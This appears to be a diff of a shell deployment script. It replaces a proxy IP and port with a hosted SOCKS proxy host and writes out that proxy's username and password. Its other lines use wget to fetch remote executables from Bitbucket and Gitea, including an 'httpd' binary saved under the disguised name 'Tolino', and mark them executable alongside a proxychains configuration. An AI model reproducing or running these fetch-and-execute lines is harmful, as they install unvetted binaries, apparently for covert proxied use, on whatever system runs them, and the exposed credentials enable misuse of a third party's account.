@@ -1,5 +1,7 @@
-proxy="192.252.209.155" 
-port="14455" 
+proxy="us-east-static-06.quotaguard.com" 
+port="1080" 
+user="neozk6kncbe8qm"  
+pass="us-east-static-06.quotaguard.com" 
 wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
